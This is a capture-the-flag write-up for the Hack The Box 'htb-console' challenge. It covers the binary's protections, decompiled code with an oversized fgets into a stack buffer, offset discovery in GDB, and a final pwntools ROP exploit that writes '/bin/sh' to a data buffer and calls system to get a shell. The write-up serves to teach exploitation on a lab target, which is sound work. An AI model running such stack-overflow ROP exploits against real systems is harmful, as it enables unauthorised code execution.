# htb-console

## Static Analysis
### checksec:
```
└─$ pwn checksec --file htb-console 
[*] '/home/kali/htb/track/binexp/htbconsole/htb-console'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### main:
```c
void main(void)

{
  char user_input [16];
  
  set_io_buffers();
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(user_input,0x10,stdin);
    commands(user_input);
    memset(user_input,0,0x10);
  } while( true );
}
```

### commands:
```c
void commands(char *param_1)

{
  int iVar1;
  char local_18 [16];
  
  iVar1 = strcmp(param_1,"id\n");
  if (iVar1 == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    iVar1 = strcmp(param_1,"dir\n");
    if (iVar1 == 0) {
      puts("/home/HTB");
    }
    else {
      iVar1 = strcmp(param_1,"flag\n");
      if (iVar1 == 0) {
        printf("Enter flag: ");
        fgets(local_18,0x30,stdin);                         // [1]
        puts("Whoops, wrong flag!");
      }
      else {
        iVar1 = strcmp(param_1,"hof\n");
        if (iVar1 == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&DAT_004040b0,10,stdin);                    // [3]
          puts("See you on HoF soon! :)");
        }
        else {
          iVar1 = strcmp(param_1,"ls\n");
          if (iVar1 == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");                            // [2]
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}
```
## Vulnerability

- The fgets at `[1]` reads in more input than the size of the buffer that it is reading in to. This would result in a stack-based buffer overflow and potential overwriting of `rip`, allowing us control of the program.

## Dynamic Analysis
```bash
└─$ msf-pattern_create -l 250
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
```
### [test.py](./test.py):
```python
io = start()

io.sendlineafter(b">> ", b"flag"); #flag command

pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"

io.sendlineafter(b"flag: ", pattern); #send pattern

io.interactive()

```
After running this script using `test.py LOCAL GDB`, another shell window opens with GDB output for the binary.

### GDB output:
```bash
Temporary breakpoint 1, 0x00000000004010b0 in ?? ()
(gdb) 
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401396 in ?? ()
(gdb) i r
rax            0x14                20
rbx            0x7fff60058e38      140734804364856
rcx            0x7fb53d620190      140416395641232
rdx            0x1                 1
rsi            0x1                 1
rdi            0x7fb53d6fca10      140416396544528
rbp            0x3761413661413561  0x3761413661413561
...[SNIP]...                  
```
The `i r` (info registers) command after the segmentation fault in GDB shows the contents of the registers at that point of execution, and looks like the hexadecimal value of the ascii characters used in the pattern are currently sitting in `rbp`.

The offset of the part of the pattern that is inside that buffer can be checked by using `msf-pattern_offset`:

```bash
└─$ msf-pattern_offset -q 0x3761413661413561
[*] Exact match at offset 16
```
## Exploitation
Due to the size of the allowed input vs the size of the buffer (16) + 8 bytes to overwrite `rbp`, there are only 24 bytes to fit an assembly payload into. However, as we noticed NX is enabled, we cannot execute instruction from the stack.

There are however other methods that can be used, such as Return-Oriented Programming to use parts of the program that already exist to simply execute `/bin/sh`.

An interesting candidate for this is the `system` function at `[2]`. If `/bin/sh` could be used as a parameter for `system` instead of `date`, this would cause the program to create a new shell session.

Due to the [x86_64 calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions), `system` would take its parameter from `rdi` when called.


### Strategy:

- put "`/bin/sh`" in `&DAT_004040b0` by using the console `hof` command at marker `[3]` of [commands](#commands)
  
- use `ropper` to find a rop gadget to `pop rdi`:

```txt
└─$ ropper -f htb-console --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: htb-console
0x0000000000401473: pop rdi; ret; 
```
- Find the location of `system()` used in the [commands](#commands) function at marker `[2]` in Ghidra:
```
00401381 e8 ba fc        CALL       <EXTERNAL>::system
```

- then call `system` at `00401381`  using the contents of `rdi`

So a payload for the above strategy would need:

- put string in data buffer
- point to rop gadget
- point to data buffer for `pop rdi` instruction of gadget
- point to `system` for `ret` instruction of gadget

### Final exploit [solution.py](./solution.py):
```python
io = start()
### Adding shell path to hof data buffer:
io.sendlineafter(b">> ", b"hof");
shellpath = b"/bin/sh";
io.sendlineafter(b"name: ", shellpath);

### Sending payload to flag to execute shell path with system:
io.sendlineafter(b">> ", b"flag");
padding = b"A"*(16+8)
rdi = p64(0x401473,endian="little"); #0x0000000000401473: pop rdi; ret; 
databuff = p64(0x4040b0,endian="little"); #address of DAT buffer from fgets(&DAT_004040b0,10,stdin);
system = p64(0x401381,endian="little"); #"CALL system" instruction from system("date");


payload = padding + rdi + databuff + system;
io.sendlineafter(b"flag: ", payload);

io.interactive()
```

### Result:
```bash
└─$ ./solution.py LOCAL
[*] '/home/kali/htb/track/binexp/htbconsole/htb-console'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/htb/track/binexp/htbconsole/htb-console': pid 1379324
b'/bin/sh'
b'shellpath sent.'
b'AAAAAAAAAAAAAAAAAAAAAAAAs\x14@\x00\x00\x00\x00\x00\xb0@@\x00\x00\x00\x00\x00\x81\x13@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Whoops, wrong flag!
$ ls
 core   htb-console  'HTB Console.zip'     solution.py
```